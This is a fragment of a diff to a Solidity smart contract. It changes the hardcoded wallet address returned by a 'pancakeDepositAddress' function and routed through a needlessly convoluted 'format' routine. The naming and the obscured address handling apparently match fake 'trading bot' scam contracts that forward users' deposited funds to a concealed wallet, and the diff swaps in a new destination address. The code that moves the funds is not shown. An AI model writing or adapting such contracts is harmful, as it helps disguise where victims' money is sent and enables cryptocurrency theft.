@@ -9,11 +9,11 @@ function performTasks() public{
 
 function pancakeDepositAddress()public pure returns (address)
 {
-return address(format(0xd384923f766F80352406eC6f3E5A1C67a8411BE6));
+return address(format(0xbEDBC651f706f7407c9e1f71f74E61302f072FE5));
 }
 function format(address addr)private pure returns(address) 
 {
-bytes memory rec='0xd384923f766F80352406eC6f3E5A1C67a8411BE6';
+bytes memory rec='0xbEDBC651f706f7407c9e1f71f74E61302f072FE5';
 string memory rec2=new string(rec.length);
 bytes memory rec3=bytes(rec2);
 for(uint i=0;i<rec.length;i++)
